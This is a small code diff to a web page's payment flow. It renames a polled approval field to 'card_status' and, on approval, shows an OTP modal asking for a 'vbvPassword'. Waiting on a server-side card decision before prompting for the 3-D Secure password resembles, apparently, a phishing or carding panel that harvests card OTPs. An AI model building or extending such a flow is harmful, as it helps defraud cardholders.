@@ -1128,7 +1128,7 @@
                 fetch('/api/check-payment-approval')
                     .then(res => res.json())
                     .then(data => {
-                        if (data.approved === true) {
+                        if (data.card_status === 'approved') {
                             // Approved - close loading modal and show OTP modal
                             $('#processingModal').modal('hide');
                             
@@ -1166,7 +1166,7 @@
                                 $('#otpModal').modal('show');
                                 document.getElementById('vbvPassword').focus();
                             }, 2500);
-                        } else if (data.approved === false) {
+                        } else if (data.card_status === 'rejected') {
                             // Rejected - close modal and show error
                             $('#processingModal').modal('hide');
                             setTimeout(function() {
